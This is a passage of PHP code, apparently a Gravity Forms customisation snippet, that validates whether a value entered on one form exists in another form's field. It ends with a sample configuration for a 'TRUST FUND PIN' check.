			'targetFormId'  => $this->_args['target_form_id'],
			'targetFieldId' => $this->_args['target_field_id'],
			'sourceFormId'  => $this->_args['source_form_id'],
			'sourceFieldId' => $this->_args['source_field_id'],
			'selectors'     => $this->get_selectors( $form ),
			'gfBaseUrl'     => GFCommon::get_base_url(),
		);

		$script = 'new GWValueExistsValidation( ' . json_encode( $args ) . ' );';
		$slug   = implode( '_', array( 'gw_value_exists_validation', $this->_args['target_form_id'], $this->_args['target_field_id'] ) );

		GFFormDisplay::add_init_script( $this->_args['target_form_id'], $slug, GFFormDisplay::ON_PAGE_RENDER, $script );

	}

	public function get_selectors( $form ) {

		$selectors = array();

		foreach( $form['fields'] as $field ) {

			if( ! $this->is_applicable_field( $field ) ) {
				continue;
			}

			$prefix = sprintf( '#input_%d_%d', $form['id'], $field->id );

			if( is_array( $field->inputs ) ) {
				foreach( $field->inputs as $input ) {
					$bits = explode( '.', $input['id'] );
					$input_id = $bits[1];
					$selectors[] = "{$prefix}_{$input_id}";
				}
			} else {
				$selectors[] = $prefix;
			}

		}

		return $selectors;
	}

	public function is_applicable_form( $form ) {

		$form_id = isset( $form['id'] ) ? $form['id'] : $form;

		return $form_id == $this->_args['target_form_id'];
	}

	public function is_applicable_field( $field ) {

		$field_map = $this->get_field_map();
		$target_field_ids = array_keys( $field_map );

		return $this->is_applicable_form( $field->formId ) && in_array( $field->id, $target_field_ids );
	}

	public function is_ajax_submission( $form_id, $is_ajax_enabled ) {
		return isset( GFFormDisplay::$submission[ $form_id ] ) && $is_ajax_enabled;
	}

}

# Configuration

new GW_Value_Exists_Validation( array(
	'target_form_id'  => 14,
	'target_field_id' => 2,
	'source_form_id'  => 1,
	'source_field_id' => 11,
	'validation_message' => 'Hey! This is not a valid TRUST FUND PIN.'
) );
